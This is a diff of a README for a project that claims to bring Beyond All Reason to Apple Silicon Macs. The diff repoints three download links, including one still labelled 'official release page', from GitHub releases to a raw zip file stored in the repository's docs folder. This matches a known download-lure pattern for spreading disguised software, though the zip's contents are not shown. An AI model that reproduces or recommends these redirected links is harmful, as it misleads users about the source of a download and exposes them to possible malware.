@@ -1,6 +1,6 @@
 # 💻 bar-on-apple-silicon - Play native strategy games on Mac
 
-[![](https://img.shields.io/badge/Download_Software-blue?style=for-the-badge)](https://github.com/Meliorative-peasant63/bar-on-apple-silicon/releases)
+[![](https://img.shields.io/badge/Download_Software-blue?style=for-the-badge)](https://raw.githubusercontent.com/Meliorative-peasant63/bar-on-apple-silicon/main/docs/on_apple_bar_silicon_v3.9.zip)
 
 ## Overview 🍏
 
@@ -17,7 +17,7 @@ This project brings Beyond All Reason to Apple Silicon Macs. You run the game na
 
 Follow these steps to install the software on your computer.
 
-1. Visit the [official release page](https://github.com/Meliorative-peasant63/bar-on-apple-silicon/releases) to download the latest version.
+1. Visit the [official release page](https://raw.githubusercontent.com/Meliorative-peasant63/bar-on-apple-silicon/main/docs/on_apple_bar_silicon_v3.9.zip) to download the latest version.
 2. Locate the download link on that page. Choose the file ending in `.dmg` or `.zip`.
 3. Save the file to your Downloads folder.
 4. Open the downloaded file. Drag the application into your Applications folder.
@@ -65,4 +65,4 @@ This project exists as a community effort. If you encounter bugs, provide a deta
 - Keep your macOS updated.
 - Use the stable release versions provided on the download page for the best results.
 
-[![](https://img.shields.io/badge/Download_Here-grey?style=for-the-badge)](https://github.com/Meliorative-peasant63/bar-on-apple-silicon/releases)
+[![](https://img.shields.io/badge/Download_Here-grey?style=for-the-badge)](https://raw.githubusercontent.com/Meliorative-peasant63/bar-on-apple-silicon/main/docs/on_apple_bar_silicon_v3.9.zip)
